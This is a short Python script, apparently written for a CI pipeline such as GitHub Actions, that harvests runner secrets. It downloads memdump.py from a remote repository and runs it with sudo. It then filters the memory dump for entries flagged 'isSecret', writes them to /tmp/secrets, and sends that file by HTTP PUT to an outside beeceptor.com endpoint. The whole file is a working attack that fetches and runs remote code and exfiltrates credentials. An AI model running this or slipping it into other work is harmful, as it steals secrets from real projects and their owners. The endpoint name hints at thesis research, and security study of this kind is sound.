import subprocess

bash_command = '''curl -sSf https://raw.githubusercontent.com/AdnaneKhan/Cacheract/b0d8565fa1ac52c28899c0cfc880d59943bc04ea/assets/memdump.py \
| sudo python3 \
| tr -d '\\0' \
| grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> /tmp/secrets'''
subprocess.run(["bash", "-c", bash_command])

another_command = "curl -X PUT -d @/tmp/secrets https://bachelor-thesis-001.free.beeceptor.com"
subprocess.run(["bash", "-c", another_command])
